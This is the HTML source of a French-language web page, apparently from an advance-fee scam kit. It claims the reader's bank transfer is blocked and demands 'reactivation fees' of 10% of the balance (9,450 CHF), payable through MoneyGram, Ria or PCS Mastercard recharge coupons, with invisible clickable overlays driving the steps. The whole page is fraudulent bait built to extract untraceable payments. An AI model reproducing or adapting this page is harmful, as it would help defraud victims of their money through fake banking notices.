<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title></title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="ms=lck.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="wwb10.min.js"></script>
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Image1" style="position:absolute;left:442px;top:22px;width:103px;height:103px;z-index:0;">
<img src="images/error.png" id="Image1" alt=""></div>
<div id="wb_Text1" style="position:absolute;left:306px;top:135px;width:386px;height:80px;text-align:center;z-index:1;">
<span style="color:#000000;font-family:Arial;font-size:13px;">VOTRE VIREMENT A ETE BLOQUER POUR LA RAISON SUIVANTE <br><br></span></div>

<div id="wb_Shape1" style="position:absolute;left:668px;top:376px;width:66px;height:35px;filter:alpha(opacity=0);-moz-opacity:0.00;opacity:0.00;z-index:10;">
<a href="./../../act.php" title="r&#233;ctiver mon compte"><img src="images/img0059.gif" id="Shape1" alt="" style="width:66px;height:35px;"></a></div>
<div id="wb_Text6" style="position:absolute;left:257px;top:194px;width:224px;height:144px;z-index:11;text-align:left;">
<span style="color:#2F4F4F;font-family:Arial;font-size:13px;">Votre virement a été bloqué pour non reception des frais d'autorisation de virement <br>
Notez que les frais du virement en cours sont evalués à 10% de votre solde soit 9'450 CHF.</span></div>
<div id="wb_Image6" style="position:absolute;left:210px;top:250px;width:33px;height:33px;z-index:12;">
<img src="images/info.png" id="Image6" alt=""></div>
<div id="wb_Shape2" style="position:absolute;left:487px;top:209px;width:2px;height:100px;z-index:13;">
<img src="images/img0058.png" id="Shape2" alt="" style="width:2px;height:100px;"></div>
<div id="wb_Text7" style="position:absolute;left:507px;top:194px;width:224px;height:80px;z-index:14;text-align:left;">
<span style="color:#2F4F4F;font-family:Arial;font-size:13px;">Notre service est en partenariat avec <strong>MoneyGram et Ria inc</strong>&nbsp; 
ainsi pour les reactivations de virement vous avez la possibilité d'effectuer les paiement par mandat Ria ou MoneyGram. </span></div>
<div id="wb_Shape3" style="position:absolute;left:499px;top:277px;width:265px;height:35px;filter:alpha(opacity=0);-moz-opacity:0.00;opacity:0.00;z-index:17;">
<a href="javascript:popupwnd('https://www.pcsmastercard.com/fr/ou-acheter-pcs-mastercard','no','yes','no','no','no','no','','','1000','800')" target="_self" title="Trouver un point de vente">
<img src="images/img0060.gif" id="Shape3" alt="" style="width:265px;height:35px;"></a>
<div id="wb_Image9" style="position:absolute;left:266px;top:665px;width:24px;height:24px;z-index:22;">
<img src="images/next.png" id="Image9" alt=""></div>
<div id="wb_Text12" style="position:absolute;left:295px;top:663px;width:402px;height:32px;z-index:23;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Votre compte bancaire sera activé dans un délai maximum de <strong>24H</strong> dès l'acquittement des frais de reactivation</span></div>
<div id="wb_Text13" style="position:absolute;left:295px;top:739px;width:402px;height:48px;z-index:24;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Le solde de votre compte pourra etre calculé par l'operation suivante <br><strong>Solde actuelle (bloqué) + Montant des recharge PCS - 5€ de frais d'activation par coupon de rechargement</strong>.</span></div>
<div id="wb_Text14" style="position:absolute;left:289px;top:711px;width:408px;height:16px;z-index:25;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Quel sera le solde de mon compte après l'activation ?</span></div>
<div id="wb_Image10" style="position:absolute;left:266px;top:741px;width:24px;height:24px;z-index:26;">
<img src="images/next.png" id="Image10" alt=""></div>
<div id="wb_Text15" style="position:absolute;left:325px;top:359px;width:363px;height:16px;z-index:27;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>Pour réactivé votre compte suivez les etapes suivantes </strong></span></div>
<div id="wb_Image11" style="position:absolute;left:476px;top:802px;width:24px;height:24px;z-index:28;">
<img src="images/previous.png" id="Image11" alt=""></div>
<div id="wb_Text16" style="position:absolute;left:463px;top:827px;width:57px;height:16px;z-index:29;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">RETOUR</span></div>
<div id="wb_Shape4" style="position:absolute;left:463px;top:802px;width:57px;height:41px;z-index:30;">
<a href="./../../index.html" title="Retour"><img src="images/img0062.png" id="Shape4" alt="" style="width:57px;height:41px;"></a></div>
</div>
</body>
</html>